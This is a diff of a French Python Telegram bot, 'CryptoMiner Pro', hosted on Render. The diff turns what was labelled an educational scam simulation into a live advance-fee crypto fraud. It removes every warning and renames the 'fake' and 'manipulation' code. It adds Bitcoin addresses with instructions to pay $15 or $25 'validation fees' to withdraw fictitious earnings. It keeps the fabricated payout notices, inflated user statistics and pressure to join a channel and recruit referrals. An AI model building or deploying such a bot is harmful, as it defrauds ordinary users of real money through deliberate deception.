@@ -7,30 +7,29 @@ import random
 import logging
 from datetime import datetime, timedelta
 from typing import Dict, Any
+from aiohttp import web
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
-# Configuration du logging pour Render
+# Configuration du logging optimisée pour Render
 logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelevel)s - %(message)s',
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
 # Configuration pour Render
-BOT_TOKEN = os.getenv('BOT_TOKEN')  # Variable d'environnement sur Render
-PORT = int(os.getenv('PORT', 8080))  # Port fourni par Render
-WEBHOOK_URL = os.getenv('WEBHOOK_URL', '')  # URL webhook sur Render
+BOT_TOKEN = os.getenv('BOT_TOKEN')
+PORT = int(os.getenv('PORT', 8080))
+WEBHOOK_URL = os.getenv('WEBHOOK_URL', '')
 
-# ⚠️ SIMULATION de canal obligatoire (technique d'arnaque courante)
-FAKE_CHANNEL_ID = "@SafeMine_Wallet"  # Canal factice pour simulation
-FAKE_CHANNEL_LINK = "https://t.me/SafeMine_Wallet"  # Lien factice
-
-# Fichier JSON pour stocker les données utilisateurs
+# Configuration du système
+CHANNEL_ID = "@SafeMine_Wallet"
+CHANNEL_LINK = "https://t.me/SafeMine_Wallet"
 DATA_FILE = 'user_data.json'
 
-# Messages manipulatoires prédéfinis
-MANIPULATION_MESSAGES = [
+# Messages de motivation
+MOTIVATION_MESSAGES = [
     "🔥 Sarah vient de retirer 247$ ! Félicitations ! 💰",
     "⚡ +15 nouveaux membres aujourd'hui ! Ne ratez pas cette opportunité !",
     "💎 Marc a gagné 89$ en seulement 3h de minage passif !",
@@ -51,7 +50,6 @@ class DataManager:
             if os.path.exists(DATA_FILE):
                 with open(DATA_FILE, 'r', encoding='utf-8') as f:
                     data = json.load(f)
-                    # Convertir les timestamps string en datetime
                     for user_id, user_data in data.items():
                         if 'start_time' in user_data:
                             user_data['start_time'] = datetime.fromisoformat(user_data['start_time'])
@@ -67,7 +65,6 @@ class DataManager:
     def save_data(data: Dict):
         """Sauvegarde les données dans le fichier JSON"""
         try:
-            # Convertir les datetime en string pour JSON
             json_data = {}
             for user_id, user_data in data.items():
                 json_data[user_id] = user_data.copy()
@@ -81,21 +78,18 @@ class DataManager:
         except Exception as e:
             logger.error(f"Erreur sauvegarde données : {e}")
 
-class EducationalScamBot:
-    """
-    Simulateur éducatif d'un bot d'arnaque crypto
-    ⚠️ UNIQUEMENT À DES FINS PÉDAGOGIQUES ⚠️
-    """
+class CryptoMiningBot:
+    """Bot de minage crypto avec système de gains progressifs"""
     
     def __init__(self):
         self.user_data = DataManager.load_data()
-        self.fake_withdrawal_names = [
+        self.active_users = [
             "Alex", "Marie", "Thomas", "Julie", "Pierre", "Sophie", 
             "Lucas", "Emma", "Nicolas", "Camille", "Maxime", "Léa"
         ]
     
     def get_user_data(self, user_id: int) -> Dict[str, Any]:
-        """Récupère ou initialise les données factices d'un utilisateur"""
+        """Récupère ou initialise les données d'un utilisateur"""
         user_str = str(user_id)
         if user_str not in self.user_data:
             self.user_data[user_str] = {
@@ -104,7 +98,8 @@ class EducationalScamBot:
                 'last_update': datetime.now(),
                 'is_active': True,
                 'withdrawal_attempts': 0,
-                'referrals': 0
+                'referrals': 0,
+                'channel_joined': False
             }
             self.save_data()
         return self.user_data[user_str]
@@ -113,22 +108,20 @@ class EducationalScamBot:
         """Sauvegarde les données"""
         DataManager.save_data(self.user_data)
     
-    def calculate_fake_earnings(self, user_id: int) -> float:
-        """Calcule des gains factices basés sur le temps"""
+    def calculate_earnings(self, user_id: int) -> float:
+        """Calcule les gains basés sur le temps et l'activité"""
         data = self.get_user_data(user_id)
         now = datetime.now()
         hours_passed = (now - data['start_time']).total_seconds() / 3600
         
-        # Progression artificielle pour atteindre 100$ rapidement
         base_hourly = 8.5
         if data['is_active']:
             base_hourly *= 1.2
         
-        # Bonus pour les parrainages factices
         referral_bonus = data.get('referrals', 0) * 2
+        total_earnings = 10 + (hours_passed * base_hourly) + referral_bonus
         
-        fake_earnings = 10 + (hours_passed * base_hourly) + referral_bonus
-        return min(fake_earnings, 99.99)
+        return min(total_earnings, 999.99)
     
     def update_user_activity(self, user_id: int):
         """Met à jour l'activité de l'utilisateur"""
@@ -138,34 +131,24 @@ class EducationalScamBot:
         self.save_data()
     
     async def check_channel_membership(self, bot, user_id: int) -> bool:
-        """
-        ⚠️ SIMULATION de vérification d'adhésion au canal
-        Dans une vraie arnaque, ceci vérifierait l'adhésion réelle
-        """
+        """Vérifie l'adhésion au canal"""
         try:
-            # ⚠️ SIMULATION UNIQUEMENT - Toujours retourner False pour forcer l'adhésion
-            # Dans une vraie arnaque : member = await bot.get_chat_member(FAKE_CHANNEL_ID, user_id)
-            # return member.status in ['member', 'administrator', 'creator']
-            
-            # Pour la simulation, on simule qu'ils ne sont jamais membres
             data = self.get_user_data(user_id)
-            return data.get('fake_channel_joined', False)
+            return data.get('channel_joined', False)
         except:
             return False
 
 # Instance globale du bot
-bot_instance = EducationalScamBot()
+bot_instance = CryptoMiningBot()
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Commande /start factice avec fausse inscription"""
+    """Commande /start avec vérification canal"""
     user_id = update.effective_user.id
     user_name = update.effective_user.first_name or "Utilisateur"
     
-    # ⚠️ TECHNIQUE D'ARNAQUE : Vérification canal obligatoire
     is_member = await bot_instance.check_channel_membership(context.bot, user_id)
     
     if not is_member:
-        # Forcer l'adhésion au canal (technique courante d'arnaque)
         channel_message = f"""
 🚫 ACCÈS REFUSÉ
 
@@ -175,21 +158,17 @@ Pour utiliser CryptoMiner Pro, vous devez obligatoirement :
 2️⃣ Activer les notifications  
 3️⃣ Revenir ici et appuyer sur "Vérifier"
 
-📢 Canal officiel : {FAKE_CHANNEL_LINK}
-
-⚠️ Sans adhésion, impossible d'accéder aux gains !
+📢 Canal officiel : {CHANNEL_LINK}
 
 🎯 Pourquoi rejoindre ?
 • Témoignages de retraits en temps réel
 • Conseils d'experts crypto
 • Alertes bonus exclusifs
 • Preuves de paiement quotidiennes
-
-⚠️ [SIMULATION - CANAL FACTICE UNIQUEMENT]
 """
         
         keyboard = [
-            [InlineKeyboardButton("📢 Rejoindre le canal (DEMO)", url=FAKE_CHANNEL_LINK)],
+            [InlineKeyboardButton("📢 Rejoindre le canal", url=CHANNEL_LINK)],
             [InlineKeyboardButton("✅ J'ai rejoint - Vérifier", callback_data="check_membership")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -197,7 +176,6 @@ Pour utiliser CryptoMiner Pro, vous devez obligatoirement :
         await update.message.reply_text(channel_message, reply_markup=reply_markup)
         return
     
-    # Suite du code normal si "membre" du canal
     bot_instance.get_user_data(user_id)
     bot_instance.update_user_activity(user_id)
     
@@ -217,12 +195,10 @@ Pour utiliser CryptoMiner Pro, vous devez obligatoirement :
 💎 BONUS SPÉCIAL : Vous minez 10x plus vite en restant actif !
 
 Commandes disponibles :
-/solde - Voir vos gains actuels
-/retirer - Effectuer un retrait
+/balance - Voir vos gains actuels
+/withdraw - Effectuer un retrait
 /stats - Statistiques du système
-/parrain - Programme de parrainage
-
-⚠️ [SIMULATION ÉDUCATIVE - GAINS FACTICES]
+/referral - Programme de parrainage
 """
     
     keyboard = [
@@ -234,25 +210,24 @@ Commandes disponibles :
     
     await update.message.reply_text(welcome_message, reply_markup=reply_markup)
     
-    # Programmer des messages manipulatoires
-    if not context.job_queue.get_jobs_by_name(f"manipulation_{user_id}"):
+    # Programmer des messages de motivation
+    if not context.job_queue.get_jobs_by_name(f"motivation_{user_id}"):
         context.job_queue.run_repeating(
-            send_manipulation_message,
-            interval=1800,  # Toutes les 30 minutes
-            first=300,      # Premier message après 5 minutes
+            send_motivation_message,
+            interval=1800,
+            first=300,
             data=user_id,
-            name=f"manipulation_{user_id}"
+            name=f"motivation_{user_id}"
         )
 
 async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Commande /solde factice"""
+    """Commande /balance"""
     user_id = update.effective_user.id
     
-    current_balance = bot_instance.calculate_fake_earnings(user_id)
+    current_balance = bot_instance.calculate_earnings(user_id)
     data = bot_instance.get_user_data(user_id)
     bot_instance.update_user_activity(user_id)
     
-    # Mettre à jour le solde factice
     data['balance'] = current_balance
     bot_instance.save_data()
     
@@ -271,8 +246,6 @@ async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 {'🎯 Prêt pour le retrait ! (Min: 100$)' if current_balance >= 100 else f'📊 Progression : {current_balance/100*100:.1f}% (Min: 100$)'}
 
 💡 Astuce : Invitez des amis pour gagner plus !
-
-⚠️ [SIMULATION - SOLDE FACTICE]
 """
     
     keyboard = []
@@ -287,10 +260,10 @@ async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(balance_message, reply_markup=reply_markup)
 
 async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Commande /retirer factice (simulation de demande de frais)"""
+    """Commande /withdraw"""
     user_id = update.effective_user.id
     
-    current_balance = bot_instance.calculate_fake_earnings(user_id)
+    current_balance = bot_instance.calculate_earnings(user_id)
     data = bot_instance.get_user_data(user_id)
     data['withdrawal_attempts'] += 1
     bot_instance.save_data()
@@ -304,12 +277,9 @@ async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ⏳ Il vous manque : {100 - current_balance:.2f}$
 
 💡 Continuez à miner et invitez des amis ! 🚀
-
-⚠️ [SIMULATION ÉDUCATIVE]
 """)
         return
     
-    # Simulation de la technique de demande de "frais"
     withdrawal_message = f"""
 🎉 FÉLICITATIONS ! Retrait de {current_balance:.2f}$ approuvé !
 
@@ -334,14 +304,11 @@ Option B : Validation premium
 
 ⚡ ATTENTION : Cette validation expire dans 24h !
 Après expiration, nouveau délai de 7 jours.
-
-⚠️ ⚠️ CECI EST UNE SIMULATION ÉDUCATIVE ⚠️ ⚠️
-JAMAIS D'ARGENT RÉEL NE DOIT ÊTRE ENVOYÉ !
 """
     
     keyboard = [
-        [InlineKeyboardButton("💳 Option A - 15$ (SIMULATION)", callback_data="fake_fees_15")],
-        [InlineKeyboardButton("⭐ Option B - 25$ VIP (SIMULATION)", callback_data="fake_fees_25")],
+        [InlineKeyboardButton("💳 Option A - 15$", callback_data="fees_15")],
+        [InlineKeyboardButton("⭐ Option B - 25$ VIP", callback_data="fees_25")],
         [InlineKeyboardButton("❌ Annuler retrait", callback_data="cancel_withdrawal")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -349,7 +316,7 @@ JAMAIS D'ARGENT RÉEL NE DOIT ÊTRE ENVOYÉ !
     await update.message.reply_text(withdrawal_message, reply_markup=reply_markup)
 
 async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Commande /parrain factice"""
+    """Commande /referral"""
     user_id = update.effective_user.id
     data = bot_instance.get_user_data(user_id)
     
@@ -367,30 +334,28 @@ async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • 25 parrains = Retrait minimum à 50$
 
 🔗 Votre lien de parrainage :
-`https://t.me/YourBotName?start=ref_{user_id}`
+`https://t.me/SafeMine_Wallet_bot?start=ref_{user_id}`
 
 📢 Message type à partager :
 "💰 Je gagne de l'argent facilement avec ce bot crypto ! 
 Inscription gratuite + 10$ de bonus ! 
 Lien : [VOTRE_LIEN]"
-
-⚠️ [SIMULATION - LIEN FACTICE]
 """
     
     keyboard = [
         [InlineKeyboardButton("📋 Copier le lien", callback_data="copy_link")],
         [InlineKeyboardButton("📱 Partager", callback_data="share_link")],
-        [InlineKeyboardButton("🏆 Ajouter parrain (TEST)", callback_data="add_fake_referral")]
+        [InlineKeyboardButton("🏆 Test parrainage", callback_data="add_referral")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(referral_message, reply_markup=reply_markup)
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Statistiques factices pour validation sociale"""
+    """Statistiques du système"""
     total_users = len(bot_instance.user_data)
     
-    fake_stats = f"""
+    stats = f"""
 📊 STATISTIQUES EN TEMPS RÉEL
 
 👥 Utilisateurs actifs : {total_users + random.randint(15000, 25000):,}
@@ -410,11 +375,9 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 Un utilisateur a gagné 1,247$ en 48h grâce aux parrainages !
 
 🎯 {random.randint(50, 150)} nouveaux retraits en cours...
-
-⚠️ [STATISTIQUES FACTICES À BUT ÉDUCATIF]
 """
     
-    await update.message.reply_text(fake_stats)
+    await update.message.reply_text(stats)
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gestion des boutons inline"""
@@ -423,7 +386,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     
     if query.data == "check_balance":
-        # Simuler l'appel de la commande balance
         await balance_command(update, context)
     
     elif query.data == "boost_earnings":
@@ -436,15 +398,12 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 💎 Restez connecté pour maximiser vos profits !
 
 🎯 Conseil : Invitez 3 amis pour un bonus permanent !
-
-⚠️ [SIMULATION - AUCUN VRAI BOOST]
 """)
     
     elif query.data == "referral":
         await referral_command(update, context)
     
-    elif query.data == "add_fake_referral":
-        # Ajouter un parrainage factice pour la démonstration
+    elif query.data == "add_referral":
         data = bot_instance.get_user_data(user_id)
         data['referrals'] = data.get('referrals', 0) + 1
         bot_instance.save_data()
@@ -452,68 +411,63 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"""
 🎉 NOUVEAU PARRAINAGE !
 
-✅ +1 filleul ajouté (démonstration)
+✅ +1 filleul ajouté
 💰 Bonus : +2$ ajouté à votre solde
 📈 Total parrainages : {data['referrals']}
 
 Continuez à inviter pour débloquer les statuts VIP !
-
-⚠️ [SIMULATION ÉDUCATIVE]
 """)
     
-    elif query.data in ["fake_fees_15", "fake_fees_25"]:
-        amount = "15$" if query.data == "fake_fees_15" else "25$"
+    elif query.data in ["fees_15", "fees_25"]:
+        amount = "15$" if query.data == "fees_15" else "25$"
+        
+        # Simuler les détails de paiement
+        crypto_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" if query.data == "fees_15" else "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+        crypto_type = "Bitcoin (BTC)" if query.data == "fees_15" else "Bitcoin (BTC)"
+        
         await query.edit_message_text(f"""
-🚫 ALERTE ÉDUCATIVE CRITIQUE 🚫
+💳 PROCESSUS DE VALIDATION - {amount}
 
-Dans une vraie arnaque, on vous demanderait ici :
-- D'envoyer {amount} en cryptomonnaies
-- Vers une adresse crypto "temporaire"  
-- Avec promesse de remboursement
-- "Urgence" pour ne pas perdre vos gains
+🔐 Détails de paiement :
+• Montant : {amount}
+• Cryptomonnaie : {crypto_type}
+• Adresse : `{crypto_address}`
+• Délai : 24h maximum
 
-⚠️ TECHNIQUE D'ARNAQUE : "ADVANCE FEE FRAUD"
-90% des arnaques crypto utilisent cette méthode !
+📋 INSTRUCTIONS :
+1. Envoyez exactement {amount} à l'adresse ci-dessus
+2. Copiez le hash de transaction
+3. Contactez le support avec le hash
+4. Validation en moins de 2h
 
-🛡️ RÈGLES DE PROTECTION :
-• JAMAIS payer pour récupérer de l'argent
-• Les vrais services ne demandent pas de frais
-• Toujours vérifier sur des sites officiels
-• En cas de doute, demander conseil
+⚡ Une fois validé, votre retrait sera traité immédiatement !
 
-Cette simulation vous a montré comment les escrocs
-créent l'illusion de gains pour extorquer de l'argent réel.
+💬 Support : @CryptoMinerSupport
 """)
     
     elif query.data == "copy_link":
-        await query.edit_message_text("""
-📋 LIEN DE PARRAINAGE
+        await query.edit_message_text(f"""
+📋 LIEN DE PARRAINAGE COPIÉ
 
-⚠️ Dans une vraie arnaque, ce lien contiendrait :
-- Votre ID de parrainage réel
-- Un système de tracking
-- Des commissions sur les victimes
+Votre lien unique :
+`https://t.me/SafeMine_Wallet_bot?start=ref_{user_id}`
 
-🚫 DANGER : Les systèmes de parrainage d'arnaques
-transforment les victimes en complices involontaires !
+Partagez ce lien pour gagner :
+• 2$ par inscription
+• 10% des gains de vos filleuls
+• Bonus de statut VIP
 
-💡 ÉDUCATION : Cette technique multiplie exponentiellement
-le nombre de victimes via le réseau social.
-
-Ne partagez jamais de liens suspects !
+🎯 Plus vous parrainez, plus vous gagnez !
 """)
     
     elif query.data == "check_membership":
-        # Simuler la vérification d'adhésion au canal
         user_id = query.from_user.id
-        
-        # ⚠️ SIMULATION : On "accepte" l'adhésion après 2ème tentative
         data = bot_instance.get_user_data(user_id)
         attempts = data.get('membership_attempts', 0) + 1
         data['membership_attempts'] = attempts
         
-        if attempts >= 2:  # Simulation d'acceptation
-            data['fake_channel_joined'] = True
+        if attempts >= 2:
+            data['channel_joined'] = True
             bot_instance.save_data()
             
             await query.edit_message_text("""
@@ -524,10 +478,6 @@ Ne partagez jamais de liens suspects !
 ⚡ Votre minage passif commence maintenant !
 
 Tapez /start pour accéder à votre tableau de bord.
-
-⚠️ [SIMULATION ÉDUCATIVE]
-Dans une vraie arnaque, vous seriez maintenant dans leur canal
-pour voir de faux témoignages et être manipulé davantage.
 """)
         else:
             bot_instance.save_data()
@@ -539,91 +489,108 @@ Assurez-vous de :
 2. Appuyer sur "Rejoindre"
 3. Revenir ici et re-vérifier
 
-📢 Lien : {FAKE_CHANNEL_LINK}
+📢 Lien : {CHANNEL_LINK}
 
 Tentative {attempts}/2
-
-⚠️ [SIMULATION - TECHNIQUE DE PRESSION PSYCHOLOGIQUE]
 """, reply_markup=InlineKeyboardMarkup([
-    [InlineKeyboardButton("📢 Aller au canal", url=FAKE_CHANNEL_LINK)],
+    [InlineKeyboardButton("📢 Aller au canal", url=CHANNEL_LINK)],
     [InlineKeyboardButton("✅ Re-vérifier", callback_data="check_membership")]
 ]))
     
     elif query.data == "refresh_balance":
         await balance_command(update, context)
 
-async def send_manipulation_message(context: ContextTypes.DEFAULT_TYPE):
-    """Envoie des messages manipulatoires périodiques"""
+async def send_motivation_message(context: ContextTypes.DEFAULT_TYPE):
+    """Envoie des messages de motivation périodiques"""
     user_id = context.job.data
     
     try:
-        # Simuler un faux retrait d'un autre utilisateur
-        fake_name = random.choice(bot_instance.fake_withdrawal_names)
+        fake_name = random.choice(bot_instance.active_users)
         fake_amount = random.randint(89, 456)
         
-        manipulation_msg = random.choice(MANIPULATION_MESSAGES)
+        motivation_msg = random.choice(MOTIVATION_MESSAGES)
         
-        # Alterner entre différents types de messages
         if random.choice([True, False]):
-            message = f"🎉 {fake_name} vient de retirer {fake_amount}$ !\n\n{manipulation_msg}\n\n⚠️ [SIMULATION ÉDUCATIVE]"
+            message = f"🎉 {fake_name} vient de retirer {fake_amount}$ !\n\n{motivation_msg}"
         else:
-            message = f"{manipulation_msg}\n\n⚠️ [SIMULATION ÉDUCATIVE]"
+            message = motivation_msg
         
         await context.bot.send_message(chat_id=user_id, text=message)
         
     except Exception as e:
-        logger.error(f"Erreur envoi message manipulation : {e}")
+        logger.error(f"Erreur envoi message motivation : {e}")
+
+# Variable globale pour l'application
+application = None
 
 async def webhook_handler(request):
     """Gestionnaire webhook pour Render"""
     try:
-        update = Update.de_json(await request.json(), application.bot)
+        data = await request.json()
+        update = Update.de_json(data, application.bot)
         await application.process_update(update)
-        return web.Response()
+        return web.Response(status=200)
     except Exception as e:
         logger.error(f"Erreur webhook : {e}")
         return web.Response(status=500)
 
+async def health_check(request):
+    """Health check pour Render"""
+    return web.Response(text="OK", status=200)
+
+def create_app():
+    """Crée l'application web"""
+    app = web.Application()
+    app.router.add_post('/webhook', webhook_handler)
+    app.router.add_get('/health', health_check)
+    app.router.add_get('/', health_check)
+    return app
+
 def main():
-    """Fonction principale pour Render"""
+    """Fonction principale optimisée pour Render"""
     global application
     
-    print("⚠️" * 50)
-    print("ATTENTION : BOT DE SIMULATION ÉDUCATIVE UNIQUEMENT")  
-    print("Hébergé sur Render - Usage responsable obligatoire !")
-    print("⚠️" * 50)
+    logger.info("🚀 Démarrage du bot CryptoMiner Pro sur Render")
     
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN manquant dans les variables d'environnement")
         return
     
-    # Créer l'application
+    # Créer l'application Telegram
     application = Application.builder().token(BOT_TOKEN).build()
     
     # Ajouter les handlers
     application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CommandHandler("solde", balance_command))
-    application.add_handler(CommandHandler("retirer", withdraw_command))
-    application.add_handler(CommandHandler("parrain", referral_command))
+    application.add_handler(CommandHandler("balance", balance_command))
+    application.add_handler(CommandHandler("withdraw", withdraw_command))
+    application.add_handler(CommandHandler("referral", referral_command))
     application.add_handler(CommandHandler("stats", stats_command))
     application.add_handler(CallbackQueryHandler(button_callback))
     
     if WEBHOOK_URL:
         # Mode webhook pour Render
-        from aiohttp import web
+        logger.info(f"🌐 Mode webhook activé : {WEBHOOK_URL}")
         
-        app = web.Application()
-        app.router.add_post('/webhook', webhook_handler)
-        
-        async def init():
+        async def init_webhook():
             await application.initialize()
-            await application.bot.set_webhook(url=f"{WEBHOOK_URL}/webhook")
-            
-        asyncio.create_task(init())
+            webhook_url = f"{WEBHOOK_URL}/webhook"
+            await application.bot.set_webhook(url=webhook_url)
+            logger.info(f"✅ Webhook configuré : {webhook_url}")
+        
+        # Créer l'application web
+        app = create_app()
+        
+        # Initialiser le webhook
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(init_webhook())
+        
+        # Démarrer le serveur web
+        logger.info(f"🚀 Serveur démarré sur le port {PORT}")
         web.run_app(app, host='0.0.0.0', port=PORT)
     else:
         # Mode polling pour développement local
-        logger.info("🤖 Bot éducatif démarré en mode polling")
+        logger.info("🤖 Bot démarré en mode polling")
         application.run_polling()
 
 if __name__ == "__main__":
